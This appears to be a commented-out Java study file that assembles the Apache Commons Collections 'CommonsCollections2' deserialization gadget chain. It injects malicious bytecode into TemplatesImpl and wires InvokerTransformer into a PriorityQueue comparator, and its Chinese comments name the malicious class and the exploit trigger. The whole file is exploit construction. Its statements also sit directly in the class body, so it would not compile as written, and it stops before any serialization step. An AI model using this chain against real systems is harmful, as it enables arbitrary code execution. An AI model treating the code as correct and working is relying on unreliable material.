//package GadGet.CommonsCollections;
//
//import Commons.Reflections;
//import javassist.ClassPool;
//import javassist.CtClass;
//import org.apache.commons.collections.comparators.TransformingComparator;
//import org.apache.commons.collections.functors.InvokerTransformer;
//
//import java.lang.reflect.Constructor;
//import java.lang.reflect.Field;
//import java.util.PriorityQueue;
//
//public class CommonsCollections2 {
//
//    ClassPool classPool = ClassPool.getDefault();
//    CtClass ctClass = classPool.getCtClass("com.cc.TestTemplatesImpl");
//    byte[] bytes = ctClass.toBytecode();
//
//    //反射创建TemplatesImpl
//    Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
//    Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{});
//    Object TemplatesImpl_instance = constructor.newInstance();
//    //将恶意类的字节码设置给_bytecodes属性
//    Field bytecodes = aClass.getDeclaredField("_bytecodes");
//    bytecodes.setAccessible(true);
//    bytecodes.set(TemplatesImpl_instance , new byte[][]{bytes});
//    //设置属性_name为恶意类名
//    Field name = aClass.getDeclaredField("_name");
//    name.setAccessible(true);
//    name.set(TemplatesImpl_instance , "TestTemplatesImpl");
//
//    //构造利用链
//    InvokerTransformer transformer=new InvokerTransformer("newTransformer",null,null);
//    TransformingComparator transformer_comparator =new TransformingComparator(transformer);
//    //触发漏洞
//    PriorityQueue queue = new PriorityQueue(2);
//    queue.add(1);
//    queue.add(1);
//
//    //设置comparator属性
//    Field field=queue.getClass().getDeclaredField("comparator");
//    field.setAccessible(true);
//    field.set(queue,transformer_comparator);
//
//    //设置queue属性
//    field=queue.getClass().getDeclaredField("queue");
//    field.setAccessible(true);
//    //队列至少需要2个元素
//    Object[] objects = new Object[]{TemplatesImpl_instance , TemplatesImpl_instance};
//    field.set(queue,objects);
//
//}
